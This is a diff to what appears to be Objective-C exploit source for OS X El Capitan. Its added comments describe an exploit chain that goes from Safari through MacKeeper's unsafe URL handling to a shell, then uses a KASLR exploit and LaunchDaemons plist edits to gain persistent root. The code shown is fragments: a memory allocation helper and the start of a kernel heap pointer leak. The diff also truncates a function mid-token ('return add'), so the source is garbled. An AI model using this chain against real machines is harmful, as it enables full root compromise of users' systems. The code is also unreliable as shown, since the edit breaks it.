@@ -3,8 +3,9 @@
 //This Exploit was desperated in 2015 in the inital release of OSX El Captian.
 // Using the knowledge of Luca Todesco, i was able to create a exploit chain, to get full root access using the 
 // Safari web broweser with MacKeeper installed.
-
-
+// Due MacKeepers unsafe URL Handling, i was able to use a Base64 webrequest to access the shell on OSX with elevated privileges,
+// after that, the KASLR exploit gave me the option, to edit the LauchDaemons plist section to gain root access, althougt the system 
+//has been rebooted.
 #include <Foundation/Foundation.h>
 static uint64_t kslide=0;
 #define ALLOCS 0x100
@@ -26,8 +27,7 @@ uint64_t alloc(uint32_t addr, uint32_t sz) {
     vm_deallocate(mach_task_self(), (vm_address_t) addr, sz);
     vm_allocate(mach_task_self(), (vm_address_t*)&addr, sz, 0);
     while(sz--) *(char*)(addr+sz)=0;
-    return addr;
-}
+    return add
 __attribute__((always_inline)) static inline
 uint64_t leak_heap_ptr(io_connect_t* co) {
     io_connect_t conn = MACH_PORT_NULL;
